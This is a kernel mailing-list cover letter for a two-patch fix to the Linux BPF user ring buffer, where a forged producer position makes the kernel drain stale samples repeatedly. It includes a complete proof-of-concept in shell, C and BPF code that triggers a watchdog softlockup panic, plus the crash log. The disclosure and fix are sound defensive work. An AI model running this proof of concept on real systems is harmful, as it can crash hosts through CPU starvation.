Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.215.181
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794193434;
	b=iy2bL5bD/aHwh1bi7UTMeSwIdBdX1RvFA0lSXwC0M/v+9Wcs14XT74xBdzZLOo8SlrQg
	 HgbamNqR+w18pGM/HpYHPdoJBWdjI3SQOXsKJuQc7lw3QSP08cjuEE+tlnJTZM8CsW3Z+
	 ow+ZTOl9VE+Ty+4wn90fbWQB4ENtpDr44ErqWY4D0x/yc0+kv2yCCGdfA85z+2i1OIGl4
	 CQIdVx2JSo1HuF6N+nyATErIGh/129td+i5VVxbQOFs4kMJMGRGQlVINuygoa79+ncDGo
	 Qzu8q6e31oKtWUnmwq9tJ1kbpx1k3SJRI/8gNhbfnFAD0gUariVRNYHtMWNEqmBWwPg==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794193434;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=x9valMKENah7KvqKHycg9AZxdPHKPi/ouMCeGes6jlk=;
	b=craKUfbAyfBVe77fF0PXj3LHC7nHsjpAiBY5wcJLa8KN0Ck8pRIidm4EUoA5VVfCQJ+I
	 y5R7Y1UN5uoRotSNjYTe10NbTShIKtmpJWSD996G47XioMe8ArCOYrm2wnQ0AAWJZ3AIL
	 x/PQ/4FvkfRJen5ZTKaiuZqH6/OqwdnhaR/FJ+8lV5Jx2FQkYeH1EAttxbh9olvaEe644
	 t8o6X5bbnRXHsT0Z/cFUKAOsMITWP9s6wLSbOi2ZrRJ6mhZhInTMPqFxuBPTF5I4b/wwL
	 PrttGCRYeFgpbXP8kHGw+mWADblFti3vBqMqyEKa5/7JrewLm7Jb4J9uxuCY+rX7v/w==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=QG8AT5IK;
	arc=none smtp.remote-ip=209.85.215.181
Received: from mail-pg1-f181.google.com (mail-pg1-f181.google.com [209.85.215.181])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DDF81606A31C
	for <bpf@vger.kernel.org>; Mon,  9 Nov 2026 03:03:53 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org DDF81606A31C
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=QG8AT5IK
Received: by mail-pg1-f181.google.com with SMTP id 41be03b00d2f7-cd69954c755so237482a12.3
        for <bpf@vger.kernel.org>; Sun, 08 Nov 2026 19:03:53 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1794193433; x=1794798233; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=x9valMKENah7KvqKHycg9AZxdPHKPi/ouMCeGes6jlk=;
        b=QG8AT5IKR6pF5Zu91AFyj8CRS8xcHq4dhSY7Sdr9MN5kMWSo4VR7cO1pMgHsS6/2JF
         1OxBbFdR7qWy66cpQfDsK0/imH8szLNxgXHoC35BP77/4zd5ttC0p6OFgalR6TrPc074
         c3bHNV3f8MdW/PxPSYVITCzbTjtc4VxHnHb6qFaQJf7FSX+OBwUqxwQT7q/L6HnFjjIV
         KEAN5ZcF+ikI/y06LmtBqXrd3VG55v3mRhK/xWNj8E1bL6Y0UBQtlO9fZU34d00lR+JO
         reZWzxPhHJfpjbamkLc84l1PcZ2leDFboeKgWgmkvhKQmIFyMxaHsVXjLQQMoOFSbus4
         5Tsw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794193433; x=1794798233;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=x9valMKENah7KvqKHycg9AZxdPHKPi/ouMCeGes6jlk=;
        b=sCSKp5kkHBhP7tKtxcT3I8hvWhWSc5yYeI7GdThnbSYn9M9lHEmemVfWSjehmYl3+f
         LUd8IsLOvPF/3U/USROH7xNebVclOkT/RJ1y3Jyi3quHj0/m5CLuUMIIOW1icWYVhCZ+
         P4NUPUzd9xHZE8Lq1+2P0sODenHLJFiOxJW9xKgoGquV+m356jQEPow/2sKVn2e/aMmZ
         jCqnqKpgqt4gUt4340f3T1hF5AxHJt8HqdP/LJppogMZWRUD8avX95GUQ7FtR4Wl4a7l
         xcr95AvTOKyPGfZDhikmvZthQwYH3quVjOTL/5Dfa7eLnxG24O/OIdMQUuLPIaaMKbqM
         DyyA==
X-Gm-Message-State: APuU4Z+4lQrU3PoY/yvLXs8jzsgKybAAPa5pbfpgIzhrosA4QGTJYpDh
	LyzeeWDQt4L0pEG+SdGLtIger9ziRw3GWOYJVfdhvZaT0ZM4Ry/0Rno9g2jOdnFDI5yqHF0NarB
	wN+SCnQ==
X-Gm-Gg: AYBFou2EI7BjDj3WLykASD4sZoSHQqaIRO4Wlx5L9WbY9+lY0t7GcuAuodYP2olcKaz
	85BHhGLxRWazkFjQKuK9SDf6yoROKIhitfEXfulUGeU3bmax+X3R1NbpUc4BOdirynu7mbCfMqp
	/m7/Qt9fWPMR1K+jPpw6WZZ0xrS4ZY7/qTzCD49sclcfSxMkhE3Hm04MMmKIWo1ejITtC+BacDy
	yzqFH5eVtcdnTT9/H96BB3lWBCxiv9v/l3QHIbjvKwBuObJb3UhGMPrnJiyiaEafdNmqdCuVVMZ
	dYhZzuLRCIV4Hn/rRnLoA5xi+o1Sz6fTO51qutIt9e82YUsL0RkbCcKQgI5rZGo338/bC9X7yAs
	ag2V7JMykpkVusNOpMoON3T2Y9vxdCzZ15u/Wru8uDROSoSjMBCbh1MC2QXLkdYjsY8mFDO1/Rn
	aOxFqBIxtp7n5phb3uWoGS0vuvKHpyoVCdzg3FyvUw1ZvfHMEHvc407WW63fQL/9TnXa8/NlfFc
	/aJvKDp+oRDrDR/awleL4Nmum0Zjg5cwzAerde7GnHlztIQ9jHDbs5x88TiAPT0cJilQuISpAvz
	PtNPLe0gBElh/sDAutlNcnn6OXvc4x+trLTI
X-Received: by 2002:a17:90a:e7d1:b0:3b0:9deb:d990 with SMTP id 98e67ed59e1d1-3b12d3d703dmr2916693a91.39.1794193432711;
        Sun, 08 Nov 2026 19:03:52 -0800 (PST)
Received: from enjou-Legion-Y7000P-2019 ([74.52.12.168])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3b12743e889sm4981759a91.0.2026.11.08.19.03.47
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 08 Nov 2026 19:03:52 -0800 (PST)
From: Ren Wei <weir@nebusec.ai>
To: bpf@vger.kernel.org
Cc: andrii@kernel.org,
	ast@kernel.org,
	daniel@iogearbox.net,
	eddyz87@gmail.com,
	memxor@gmail.com,
	martin.lau@linux.dev,
	song@kernel.org,
	yonghong.song@linux.dev,
	jolsa@kernel.org,
	emil@etsalapatis.com,
	ihor.solodrai@linux.dev,
	void@manifault.com,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	weir@nebusec.ai
Subject: [PATCH bpf 0/2] bpf: Reject user ringbuf backlogs larger than total ring size
Date: Mon,  9 Nov 2026 11:03:43 +0800
Message-ID: <cover.1793951856.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.53.0
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Post: <mailto:bpf@vger.kernel.org>
List-Help: <mailto:bpf+help@vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
List-Owner: <mailto:bpf+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in kernel/bpf/ringbuf.c affecting the
user-space ring buffer implementation (BPF_MAP_TYPE_USER_RINGBUF).

This bug is tracked at: https://bugtracker.nebusec.ai/f/15643

Privilege requirements & reachability:
In our validation environment, unprivileged BPF is disabled at runtime
(kernel.unprivileged_bpf_disabled = 2). Consequently, loading the BPF
tracing program (SEC("fentry/__x64_sys_getpgid")) and creating the
BPF_MAP_TYPE_USER_RINGBUF map requires root (UID 0) / CAP_BPF +
CAP_PERFMON. Furthermore, configuring the watchdog threshold and panic
sysctls (/proc/sys/kernel/watchdog_thresh and softlockup_panic) to
accelerate watchdog detection in the test harness requires root (UID 0 /
CAP_SYS_ADMIN). The reproducer and crash log therefore run under UID 0.

While the underlying logic bug allows any process with write access to
an existing user ringbuffer's producer position page to forge an
oversized backlog, the end-to-end reproducer operates in a privileged
context (UID 0) in this test setup.

Impact boundary:
Because user space has write access to the producer position page of a
user ring buffer, user space can forge an unread window (prod_pos -
cons_pos) that spans many laps ahead of the physical ring buffer.
When bpf_user_ringbuf_drain() runs, it repeatedly wraps around the
physical buffer and drains old or stale samples without fresh writes.
With a compute-heavy callback, this leads to CPU starvation and
watchdog softlockup panics.

This patch series resolves the issue in two commits:
- Patch 1/2 validates in __bpf_user_ringbuf_peek() that the advertised
  backlog (prod_pos - cons_pos) does not exceed ringbuf_total_data_sz(rb),
  returning -EINVAL if the backlog spans beyond the physical buffer.
- Patch 2/2 adds a dedicated selftest case in tools/testing/selftests/bpf
  to assert that an unread backlog larger than the ring size returns
  -EINVAL and drains 0 samples.

=== details below ===

Bug details:

In __bpf_user_ringbuf_peek(), the kernel only checks that individual
sample length does not exceed the advertised unread window
(prod_pos - cons_pos) and does not exceed the total data capacity
(ringbuf_total_data_sz(rb)):

    total_len = round_up(sample_len + BPF_RINGBUF_HDR_SZ, 8);
    if (total_len > prod_pos - cons_pos)
        return -EINVAL;
    if (total_len > ringbuf_total_data_sz(rb))
        return -E2BIG;

However, the kernel does not check the invariant that the entire unread
window (prod_pos - cons_pos) must not exceed the physical buffer size:
prod_pos - cons_pos <= ringbuf_total_data_sz(rb).

Since the producer page is mapped writable to user space, a malicious
producer can advance producer_pos across multiple logical laps while
populating only one physical lap. When the kernel drains the buffer via
bpf_user_ringbuf_drain(), cons_pos wraps around repeatedly within the
forged window and re-executes callbacks on stale or already-consumed
samples up to 131,072 times per drain call.

We fix this by checking prod_pos - cons_pos > ringbuf_total_data_sz(rb)
in __bpf_user_ringbuf_peek() and returning -EINVAL immediately when an
oversized backlog is detected.

Testing & Validation:
We validated both the bug reproduction and the fix in an x86 QEMU guest
(4 vCPUs, 4GB RAM) with CONFIG_DEBUG_INFO_BTF=y launched with:

    qemu-system-x86_64 -m 4G -smp 4 -machine accel=kvm \
        -cpu Haswell-v4,pmu=off,-vmx,-smep,-smap \
        -kernel arch/x86/boot/bzImage \
        -append "root=/dev/sda rw console=ttyS0 oops=panic" \
        -drive file=rootfs.qcow2,format=qcow2 -nographic

1. Pre-fix verification:
   Running ./poc.sh replay demonstrates repeated replays of stale samples:
   - Initial state: consumer_pos=0 producer_pos=4194304 (1024 laps)
   - First drain: callbacks=131072 wraps=511 ret=131072
     consumer_pos=2097152
   - Second drain: callbacks=262144 wraps=1023 ret=131072
     consumer_pos=4194304
   Running ./poc.sh panic with a heavy callback triggers a watchdog
   softlockup panic (see crash log below).

2. Post-fix verification:
   - Running ./poc.sh replay immediately returns ret=-22 (-EINVAL):
     callbacks=0 wraps=0 ret=-22 consumer_pos=0
   - Running ./poc.sh panic returns ret=-22 with zero callbacks and does
     not crash or stall.
   - Normal operation check with a single lap of backlog (./poc.sh
     normal, i.e. ./poc 1) drains 256 valid samples normally
     (callbacks=256 wraps=0 ret=256), confirming zero regression.

3. Selftest verification:
   The added test case
   test_user_ringbuf_post_backlog_larger_than_ringbuf_sz in
   tools/testing/selftests/bpf/prog_tests/user_ringbuf.c writes a valid
   sample header, advances producer_pos past consumer_pos by 2 * ring_size,
   and verifies that bpf_user_ringbuf_drain() returns -EINVAL and drains
   0 samples.

Reproducer:
Build the BPF objects and userspace harness inside the QEMU guest:
    clang -O2 -g -target bpf -D__TARGET_ARCH_x86 -c poc.bpf.c \
        -o poc_replay.bpf.o
    clang -O2 -g -target bpf -D__TARGET_ARCH_x86 -c poc_softlockup.bpf.c \
        -o poc_softlockup.bpf.o
    gcc -static -O2 poc.c -o poc -lbpf -lelf -lz -lzstd
    chmod +x poc.sh

Execute verification:
    ./poc.sh replay    # Replay demonstration (1024 laps backlog)
    ./poc.sh panic     # Watchdog softlockup panic
    ./poc.sh normal    # Normal operation verification (1 lap backlog)

=== BEGIN poc.sh ===
#!/bin/sh
set -eu

mode="${1:-replay}"

if [ "$mode" = "panic" ]; then
	cp poc_softlockup.bpf.o poc.bpf.o
	echo 1 > /proc/sys/kernel/watchdog_thresh
	echo 1 > /proc/sys/kernel/softlockup_panic
	./poc 1024
elif [ "$mode" = "normal" ]; then
	cp poc_replay.bpf.o poc.bpf.o
	./poc 1
else
	cp poc_replay.bpf.o poc.bpf.o
	./poc 1024
fi
=== END poc.sh ===

=== BEGIN poc.c ===
// SPDX-License-Identifier: GPL-2.0
#define _GNU_SOURCE
#include <errno.h>
#include <linux/bpf.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <unistd.h>

#define OBJ_FILE "poc.bpf.o"
#define RING_SIZE 4096
#define PAGE_SZ 4096
#define SAMPLE_PAYLOAD_SIZE 8
#define TOTAL_SAMPLE_SIZE (SAMPLE_PAYLOAD_SIZE + BPF_RINGBUF_HDR_SZ)
#define SAMPLES_PER_LAP (RING_SIZE / TOTAL_SAMPLE_SIZE)
#define DEFAULT_BACKLOG_LAPS 1024
#define MAGIC 0x52504c59u

struct replay_sample {
	uint32_t seq;
	uint32_t magic;
};

struct stats {
	uint64_t invocations;
	uint64_t callbacks;
	uint64_t wraps;
	uint64_t last_seq;
	uint64_t last_magic;
	int64_t last_drain_ret;
};

static int libbpf_log_fn(enum libbpf_print_level level, const char *fmt, va_list args)
{
	if (level == LIBBPF_DEBUG)
		return 0;
	return vfprintf(stderr, fmt, args);
}

static void smp_store_release_u64(uint64_t *ptr, uint64_t value)
{
	__atomic_store_n(ptr, value, __ATOMIC_RELEASE);
}

static int bump_memlock(void)
{
	struct rlimit lim = {
		.rlim_cur = RLIM_INFINITY,
		.rlim_max = RLIM_INFINITY,
	};

	return setrlimit(RLIMIT_MEMLOCK, &lim);
}

static void fill_ring(void *data)
{
	size_t i;

	memset(data, 0, RING_SIZE);
	for (i = 0; i < SAMPLES_PER_LAP; i++) {
		uint8_t *slot = (uint8_t *)data + i * TOTAL_SAMPLE_SIZE;
		uint32_t *hdr_len = (uint32_t *)slot;
		struct replay_sample *sample = (struct replay_sample *)(slot + BPF_RINGBUF_HDR_SZ);

		*hdr_len = SAMPLE_PAYLOAD_SIZE;
		sample->seq = i;
		sample->magic = MAGIC;
	}
}

static int lookup_stats(int map_fd, struct stats *stats)
{
	uint32_t key = 0;

	return bpf_map_lookup_elem(map_fd, &key, stats);
}

int main(int argc, char **argv)
{
	uint32_t backlog_laps = DEFAULT_BACKLOG_LAPS;
	struct bpf_object *obj = NULL;
	struct bpf_program *prog;
	struct bpf_link *link = NULL;
	struct bpf_map *urb_map, *stats_map;
	struct stats stats = {};
	uint64_t *consumer_pos = MAP_FAILED, *producer_pos = MAP_FAILED;
	void *data = MAP_FAILED;
	int urb_fd, stats_fd;
	int err = 1;
	long ret;

	libbpf_set_print(libbpf_log_fn);
	libbpf_set_strict_mode(LIBBPF_STRICT_ALL);

	if (bump_memlock() && errno != EPERM)
		perror("setrlimit(RLIMIT_MEMLOCK)");

	obj = bpf_object__open_file(OBJ_FILE, NULL);
	if (!obj) {
		fprintf(stderr, "failed to open %s\n", OBJ_FILE);
		goto out;
	}

	err = bpf_object__load(obj);
	if (err) {
		fprintf(stderr, "failed to load BPF object: %d\n", err);
		goto out;
	}

	prog = bpf_object__find_program_by_name(obj, "drain_user_ringbuf");
	if (!prog) {
		fprintf(stderr, "failed to find drain_user_ringbuf\n");
		goto out;
	}

	link = bpf_program__attach(prog);
	if (!link) {
		err = -errno;
		fprintf(stderr, "failed to attach fentry program: %d\n", err);
		goto out;
	}

	urb_map = bpf_object__find_map_by_name(obj, "user_ringbuf");
	stats_map = bpf_object__find_map_by_name(obj, "stats_map");
	if (!urb_map || !stats_map) {
		fprintf(stderr, "failed to find maps\n");
		goto out;
	}

	urb_fd = bpf_map__fd(urb_map);
	stats_fd = bpf_map__fd(stats_map);

	consumer_pos = mmap(NULL, PAGE_SZ, PROT_READ, MAP_SHARED, urb_fd, 0);
	producer_pos = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_SHARED, urb_fd, PAGE_SZ);
	data = mmap(NULL, RING_SIZE * 2, PROT_READ | PROT_WRITE, MAP_SHARED, urb_fd, PAGE_SZ * 2);
	if (consumer_pos == MAP_FAILED || producer_pos == MAP_FAILED || data == MAP_FAILED) {
		perror("mmap");
		goto out;
	}

	if (argc > 1) {
		int val = atoi(argv[1]);
		if (val > 0)
			backlog_laps = (uint32_t)val;
	}

	fill_ring(data);
	smp_store_release_u64(producer_pos, (uint64_t)RING_SIZE * backlog_laps);

	printf("prepared one physical lap with %u samples and advertised %u laps of backlog\n",
	       SAMPLES_PER_LAP, backlog_laps);
	printf("initial consumer_pos=%llu producer_pos=%llu\n",
	       (unsigned long long)__atomic_load_n(consumer_pos, __ATOMIC_ACQUIRE),
	       (unsigned long long)__atomic_load_n(producer_pos, __ATOMIC_ACQUIRE));

	ret = syscall(SYS_getpgid, 0);
	if (ret < 0) {
		perror("getpgid");
		goto out;
	}

	if (lookup_stats(stats_fd, &stats)) {
		perror("bpf_map_lookup_elem(stats)");
		goto out;
	}

	printf("after first drain: invocations=%llu callbacks=%llu wraps=%llu last_seq=%llu last_magic=0x%llx ret=%lld consumer_pos=%llu\n",
	       (unsigned long long)stats.invocations,
	       (unsigned long long)stats.callbacks,
	       (unsigned long long)stats.wraps,
	       (unsigned long long)stats.last_seq,
	       (unsigned long long)stats.last_magic,
	       (long long)stats.last_drain_ret,
	       (unsigned long long)__atomic_load_n(consumer_pos, __ATOMIC_ACQUIRE));

	ret = syscall(SYS_getpgid, 0);
	if (ret < 0) {
		perror("getpgid");
		goto out;
	}

	if (lookup_stats(stats_fd, &stats)) {
		perror("bpf_map_lookup_elem(stats, second)");
		goto out;
	}

	printf("after second drain: invocations=%llu callbacks=%llu wraps=%llu last_seq=%llu last_magic=0x%llx ret=%lld consumer_pos=%llu\n",
	       (unsigned long long)stats.invocations,
	       (unsigned long long)stats.callbacks,
	       (unsigned long long)stats.wraps,
	       (unsigned long long)stats.last_seq,
	       (unsigned long long)stats.last_magic,
	       (long long)stats.last_drain_ret,
	       (unsigned long long)__atomic_load_n(consumer_pos, __ATOMIC_ACQUIRE));

	if (stats.last_magic != MAGIC) {
		fprintf(stderr, "unexpected sample contents\n");
		goto out;
	}

	if (backlog_laps <= 1) {
		if (stats.callbacks == SAMPLES_PER_LAP && stats.wraps == 0) {
			printf("normal operation verified: drained %u samples without replay or wrap\n",
			       SAMPLES_PER_LAP);
			err = 0;
		} else {
			fprintf(stderr, "unexpected normal drain result: callbacks=%llu wraps=%llu\n",
			        (unsigned long long)stats.callbacks,
			        (unsigned long long)stats.wraps);
		}
		goto out;
	}

	if (stats.callbacks <= SAMPLES_PER_LAP || stats.wraps == 0) {
		fprintf(stderr, "replay was not observed\n");
		goto out;
	}

	printf("replay observed: the kernel consumed more than one lap of samples without new producer writes\n");
	err = 0;

out:
	if (data != MAP_FAILED)
		munmap(data, RING_SIZE * 2);
	if (producer_pos != MAP_FAILED)
		munmap(producer_pos, PAGE_SZ);
	if (consumer_pos != MAP_FAILED)
		munmap(consumer_pos, PAGE_SZ);
	if (link)
		bpf_link__destroy(link);
	if (obj)
		bpf_object__close(obj);
	return err;
}
=== END poc.c ===

=== BEGIN poc.bpf.c ===
// SPDX-License-Identifier: GPL-2.0
#define __u8 unsigned char
#define __u16 unsigned short
#define __u32 unsigned int
#define __u64 unsigned long long
#define __s32 int
#define __s64 long long
#define __be16 __u16
#define __be32 __u32
#define __wsum __u32

#include <bpf/bpf_helpers.h>

#define BPF_MAP_TYPE_ARRAY 2
#define BPF_MAP_TYPE_USER_RINGBUF 31
#define RING_SIZE 4096
#define BPF_RINGBUF_HDR_SZ 8
#define SAMPLE_PAYLOAD_SIZE 8
#define SAMPLES_PER_LAP (RING_SIZE / (SAMPLE_PAYLOAD_SIZE + BPF_RINGBUF_HDR_SZ))
#define MAGIC 0x52504c59

struct replay_sample {
	__u32 seq;
	__u32 magic;
};

struct stats {
	__u64 invocations;
	__u64 callbacks;
	__u64 wraps;
	__u64 last_seq;
	__u64 last_magic;
	__s64 last_drain_ret;
};

struct {
	__uint(type, BPF_MAP_TYPE_USER_RINGBUF);
	__uint(max_entries, RING_SIZE);
} user_ringbuf SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, struct stats);
} stats_map SEC(".maps");

static __always_inline struct stats *get_stats(void)
{
	__u32 key = 0;

	return bpf_map_lookup_elem(&stats_map, &key);
}

static long drain_cb(struct bpf_dynptr *dynptr, void *ctx)
{
	struct replay_sample sample = {};
	struct stats *stats;

	stats = get_stats();
	if (!stats)
		return 1;

	if (bpf_dynptr_read(&sample, sizeof(sample), dynptr, 0, 0))
		return 1;

	stats->callbacks++;
	if (stats->callbacks > 1 && sample.seq < stats->last_seq)
		stats->wraps++;

	stats->last_seq = sample.seq;
	stats->last_magic = sample.magic;
	return 0;
}

SEC("fentry/__x64_sys_getpgid")
int drain_user_ringbuf(void *ctx)
{
	struct stats *stats;

	stats = get_stats();
	if (!stats)
		return 0;

	stats->invocations++;
	stats->last_drain_ret = bpf_user_ringbuf_drain(&user_ringbuf, drain_cb, NULL, 0);
	return 0;
}

char LICENSE[] SEC("license") = "GPL";
=== END poc.bpf.c ===

=== BEGIN poc_softlockup.bpf.c ===
// SPDX-License-Identifier: GPL-2.0
#define __u8 unsigned char
#define __u16 unsigned short
#define __u32 unsigned int
#define __u64 unsigned long long
#define __s32 int
#define __s64 long long
#define __be16 __u16
#define __be32 __u32
#define __wsum __u32

#include <bpf/bpf_helpers.h>

#define BPF_MAP_TYPE_ARRAY 2
#define BPF_MAP_TYPE_USER_RINGBUF 31
#define RING_SIZE 4096
#define BPF_RINGBUF_HDR_SZ 8
#define SAMPLE_PAYLOAD_SIZE 8
#define SAMPLES_PER_LAP (RING_SIZE / (SAMPLE_PAYLOAD_SIZE + BPF_RINGBUF_HDR_SZ))
#define MAGIC 0x52504c59

struct replay_sample {
	__u32 seq;
	__u32 magic;
};

struct stats {
	__u64 invocations;
	__u64 callbacks;
	__u64 wraps;
	__u64 last_seq;
	__u64 last_magic;
	__s64 last_drain_ret;
};

struct {
	__uint(type, BPF_MAP_TYPE_USER_RINGBUF);
	__uint(max_entries, RING_SIZE);
} user_ringbuf SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, struct stats);
} stats_map SEC(".maps");

static __always_inline struct stats *get_stats(void)
{
	__u32 key = 0;

	return bpf_map_lookup_elem(&stats_map, &key);
}

static long drain_cb(struct bpf_dynptr *dynptr, void *ctx)
{
	struct replay_sample sample = {};
	struct stats *stats;

	stats = get_stats();
	if (!stats)
		return 1;

	if (bpf_dynptr_read(&sample, sizeof(sample), dynptr, 0, 0))
		return 1;

	stats->callbacks++;
	if (stats->callbacks > 1 && sample.seq < stats->last_seq)
		stats->wraps++;

#pragma clang loop unroll(disable)
	for (int i = 0; i < 200000; i++)
		asm volatile("" : : : "memory");

	stats->last_seq = sample.seq;
	stats->last_magic = sample.magic;
	return 0;
}

SEC("fentry/__x64_sys_getpgid")
int drain_user_ringbuf(void *ctx)
{
	struct stats *stats;

	stats = get_stats();
	if (!stats)
		return 0;

	stats->invocations++;
	stats->last_drain_ret = bpf_user_ringbuf_drain(&user_ringbuf, drain_cb, NULL, 0);
	return 0;
}

char LICENSE[] SEC("license") = "GPL";
=== END poc_softlockup.bpf.c ===

=== BEGIN crash log ===
[  494.301649][    C2] watchdog: BUG: soft lockup - CPU#2 stuck for 3s! [poc:964]
[  494.301665][    C2] Modules linked in:
[  494.301687][    C2] CPU: 2 UID: 0 PID: 964 Comm: poc Not tainted 6.12.95 #4 53deed68f5e8c87eac9412ec2ca16e6c37d9fe62
[  494.301697][    C2] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  494.301700][    C2] RIP: 0010:bpf_prog_56ce035abe37ff65_drain_cb+0xa0/0xdf
[  494.301727][    C2] Code: f2 31 c9 45 31 c0 e8 73 30 a5 c1 48 85 c0 75 31 48 8b 7b 08 48 83 c7 01 48 89 7b 08 48 83 ff 01 77 2d bf 40 0d 03 00 83 c7 ff <85> ff 74 02 eb f7 8b 7d f0 48 89 7b 18 8b 7d f4 48 89 7b 20 45 31
[  494.301730][    C2] RSP: 0018:ffffc90002d77d60 EFLAGS: 00000217
[  494.301744][    C2] RAX: 0000000000000000 RBX: ffff8881134365f8 RCX: 0000000000000000
[  494.301746][    C2] RDX: 0000000000000008 RSI: 0000000000000070 RDI: 0000000000000bbb
[  494.301749][    C2] RBP: ffffc90002d77d88 R08: ffffc90001474720 R09: fffff520005aefaf
[  494.301751][    C2] R10: ffffc90002d77d7f R11: 00000000003a68f0 R12: 0000000000000008
[  494.301753][    C2] R13: 0000000000000001 R14: ffffc90002d77e50 R15: ffffc90001471000
[  494.301757][    C2] FS:  00007d496e51a740(0000) GS:ffff88811a200000(0000) knlGS:0000000000000000
[  494.301760][    C2] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  494.301763][    C2] CR2: 00007d496e793626 CR3: 0000000117828005 CR4: 0000000000770ef0
[  494.301767][    C2] PKRU: 55555554
[  494.301769][    C2] Call Trace:
[  494.301772][    C2]  <TASK>
[  494.301782][    C2]  bpf_user_ringbuf_drain+0x2c7/0x570
[  494.301819][    C2]  ? 0xffffffffc000dd9c
[  494.301837][    C2]  ? __pfx_bpf_user_ringbuf_drain+0x10/0x10
[  494.301845][    C2]  ? srso_alias_return_thunk+0x5/0xfbef5
[  494.301898][    C2]  bpf_prog_8c9b0c57f27a57ab_drain_user_ringbuf+0x7b/0x88
[  494.301906][    C2]  bpf_trampoline_6442594278+0x43/0xa7
[  494.301915][    C2]  __x64_sys_getpgid+0x9/0x40
[  494.301921][    C2]  do_syscall_64+0x6f/0x150
[  494.301940][    C2]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[  494.301947][    C2] RIP: 0033:0x7d496e6f77b9
[  494.301953][    C2] Code: ff c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 27 66 0d 00 f7 d8 64 89 01 48
[  494.301956][    C2] RSP: 002b:00007ffc8d764cf8 EFLAGS: 00000246 ORIG_RAX: 0000000000000079
[  494.301959][    C2] RAX: ffffffffffffffda RBX: 0000574d6cdc22a0 RCX: 00007d496e6f77b9
[  494.301961][    C2] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000000
[  494.301963][    C2] RBP: 0000000000000000 R08: 00000000fffffff9 R09: 0000000000000040
[  494.301965][    C2] R10: 0000000000000075 R11: 0000000000000246 R12: 00007d496e82b000
[  494.301967][    C2] R13: 00007d496e82d000 R14: 00007ffc8d764d20 R15: 00007d496e82e000
[  494.301989][    C2]  </TASK>
[  494.301995][    C2] Kernel panic - not syncing: softlockup: hung tasks
[  494.319721][    C2] CPU: 2 UID: 0 PID: 964 Comm: poc Tainted: G             L     6.12.95 #4 53deed68f5e8c87eac9412ec2ca16e6c37d9fe62
[  494.320502][    C2] Tainted: [L]=SOFTLOCKUP
[  494.320792][    C2] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  494.321595][    C2] Call Trace:
[  494.321818][    C2]  <IRQ>
[  494.322011][    C2]  panic+0x544/0x620
[  494.322285][    C2]  ? __pfx_panic+0x10/0x10
[  494.322595][    C2]  ? add_taint+0x2a/0x90
[  494.322873][    C2]  watchdog_timer_fn+0x31d/0x3b0
